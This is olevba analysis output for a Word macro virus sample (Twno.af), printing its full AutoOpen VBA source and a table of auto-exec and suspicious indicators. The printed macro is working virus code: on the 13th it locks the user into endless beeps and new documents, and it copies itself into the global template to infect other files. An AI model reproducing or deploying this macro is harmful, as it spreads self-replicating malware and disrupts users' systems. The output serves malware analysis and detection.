olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Twno.af-42d2f2af07a886e091c6b90e4d071c64ec81289f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Twno.af-42d2f2af07a886e091c6b90e4d071c64ec81289f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Twno.af-42d2f2af07a886e091c6b90e4d071c64ec81289f - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim nm__()
Public Sub MAIN()
ReDim nm__(4)
Dim ans$
Dim j
Dim nor
Dim kk
Dim t
Dim file$
Dim nor1
Dim kkk
Dim tt
WordBasic.DisableInput 1
If WordBasic.Day(WordBasic.Now()) = 13 Then
try:
On Error GoTo -1: On Error GoTo 0
On Error GoTo -1: On Error GoTo try
WordBasic.Beep
WordBasic.MsgBox "àË£¡ÎÒÃÇÀ´Íæ¸öÓÎÏ·£¬ÔõÃ´Ñù£¿", "NO.2 Macro Virus"
ans$ = WordBasic.[InputBox$]("ÄãÀ´²Â²ÂÎÒÊÇË­£¿", "Who am I ?")
If ans$ <> "Daniel Lee" Then
While -1
For j = 1 To 200
WordBasic.Beep
WordBasic.FileNewDefault
Next j
Wend
End If
End If
nor = WordBasic.CountMacros(0)
If nor > 0 Then
For kk = 1 To nor
If WordBasic.[MacroName$](kk, 0) = "AutoOpen" Then
t = 1
End If
Next kk
End If
file$ = WordBasic.[FileName$]()
file$ = file$ + ":AutoOpen"
If t <> 1 Then
WordBasic.MacroCopy file$, "AutoOpen"
WordBasic.MacroCopy file$, "AutoNew"
WordBasic.MacroCopy file$, "AutoClose"
End If
nor1 = WordBasic.CountMacros(1)
If nor1 > 0 Then
For kkk = 1 To nor1
If WordBasic.[MacroName$](kkk, 1) = "AutoOpen" Then
tt = 1
End If
Next kkk
End If
If tt <> 1 Then
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "AutoOpen", file$
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

